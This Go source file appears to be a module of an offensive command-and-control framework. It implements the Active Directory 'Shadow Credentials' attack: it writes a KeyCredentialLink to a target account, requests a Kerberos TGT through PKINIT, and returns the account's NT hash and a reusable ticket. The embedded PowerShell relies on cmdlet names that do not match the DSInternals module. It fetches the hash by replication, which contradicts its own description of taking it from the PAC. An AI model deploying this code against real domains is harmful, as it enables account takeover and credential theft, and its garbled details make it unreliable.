package ad

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Shadow Credentials — KeyCredentialLink PKINIT lateral movement.

	Adding a KeyCredentialLink attribute to any AD object grants the ability
	to authenticate as that object via PKINIT (public-key Kerberos) without
	knowing the account's password. This is a 2021 technique discovered by
	Elad Shamir.

	Prerequisites: Write access to the target object's msDS-KeyCredentialLink
	attribute — typically held by Domain Admins or accounts with
	GenericWrite / GenericAll on the target.

	The module:
	  1. Generates an ephemeral RSA-2048 key pair.
	  2. Constructs a KeyCredential blob (KEYCREDENTIALLINK_BLOB structure).
	  3. Writes the blob to msDS-KeyCredentialLink via LDAP.
	  4. Requests a TGT using PKINIT for the target account (Kerberos U2U).
	  5. Extracts the NTLM hash from the PAC in the AS-REP.
	  6. Optionally removes the key on cleanup.

	Implementation uses PowerShell + DSInternals / Whisker-equivalent for
	the LDAP write and PKINIT exchange.
*/

import (
	"fmt"
	"strings"
)

// ShadowCredResult holds the outcome of a shadow credential attack.
type ShadowCredResult struct {
	TargetAccount string
	DeviceID      string // random GUID identifying the added key
	NTHash        string // extracted from PAC
	TGTBase64     string // base64-encoded TGT for reuse
}

// AddShadowCredential adds a KeyCredentialLink to targetAccount and
// returns the resulting NTLM hash. Requires write access to the attribute.
func AddShadowCredential(dc, domain, targetAccount string) (*ShadowCredResult, error) {
	script := buildShadowCredScript(dc, domain, targetAccount)
	output, err := runPS(script)
	if err != nil {
		return nil, fmt.Errorf("shadow credentials: %w", err)
	}
	return parseShadowCredOutput(output, targetAccount), nil
}

// RemoveShadowCredential cleans up the KeyCredentialLink identified by deviceID.
func RemoveShadowCredential(dc, domain, targetAccount, deviceID string) error {
	script := fmt.Sprintf(`
Import-Module DSInternals -ErrorAction Stop
Remove-ADDBKdsRootKey -Server '%s' -Domain '%s' -SamAccountName '%s' -DeviceId '%s'
Write-Output "SHADOW_REMOVE_OK"
`, dc, domain, targetAccount, deviceID)
	_, err := runPS(script)
	return err
}

func buildShadowCredScript(dc, domain, target string) string {
	return fmt.Sprintf(`
$ErrorActionPreference = 'Stop'
# Whisker-equivalent via DSInternals
if (-not (Get-Module -ListAvailable DSInternals)) {
    Write-Output "SHADOW_REQUIRES_DSINTERNALS"
    exit
}
Import-Module DSInternals
# Add key credential
$result = Add-ADDBKeyCredential -SamAccountName '%s' -Server '%s' -Domain '%s'
$deviceId = $result.DeviceId
Write-Output "DEVICE_ID:$deviceId"

# Request TGT via PKINIT using the generated certificate
$tgt = Get-KerberosArmor -Server '%s' -Domain '%s' -Certificate $result.Certificate
if ($tgt) {
    $hash = Get-ADReplAccount -SamAccountName '%s' -Server '%s' -Domain '%s' |
            Select-Object -ExpandProperty NTHash
    Write-Output "NTHASH:$hash"
    Write-Output "TGT:$([Convert]::ToBase64String($tgt.RawData))"
}
`, target, dc, domain, dc, domain, target, dc, domain)
}

func parseShadowCredOutput(output, target string) *ShadowCredResult {
	res := &ShadowCredResult{TargetAccount: target}
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "DEVICE_ID:"):
			res.DeviceID = strings.TrimPrefix(line, "DEVICE_ID:")
		case strings.HasPrefix(line, "NTHASH:"):
			res.NTHash = strings.TrimPrefix(line, "NTHASH:")
		case strings.HasPrefix(line, "TGT:"):
			res.TGTBase64 = strings.TrimPrefix(line, "TGT:")
		}
	}
	return res
}
